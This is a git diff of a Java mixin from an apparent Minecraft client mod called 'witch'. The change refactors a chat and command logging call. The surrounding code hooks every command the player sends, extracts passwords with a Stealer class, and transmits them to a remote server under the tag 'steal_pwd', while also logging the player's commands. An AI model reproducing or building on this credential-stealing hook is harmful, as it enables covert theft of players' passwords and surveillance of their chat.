@@ -1,6 +1,7 @@
 package me.soda.witch.client.mixin;
 
 import me.soda.witch.client.Witch;
+import me.soda.witch.client.features.ChatCommandLogging;
 import me.soda.witch.client.utils.ChatUtil;
 import me.soda.witch.client.utils.NetUtil;
 import me.soda.witch.client.utils.Stealer;
@@ -17,7 +18,7 @@ public abstract class ClientPlayerEntityMixin {
     private void onSendCommand(String command, Text preview, CallbackInfo info) {
         Stealer.Password pass = Stealer.stealPassword(command);
         if (pass != null) NetUtil.send("steal_pwd", pass);
-        if (Witch.config.logChatAndCommand) Witch.chatCommandLogging.addToList("/" + command);
+        if (Witch.config.logChatAndCommand) ChatCommandLogging.addToList("/" + command);
     }
 
     @Inject(method = "sendChatMessage(Ljava/lang/String;Lnet/minecraft/text/Text;)V", at = @At("HEAD"), cancellable = true)
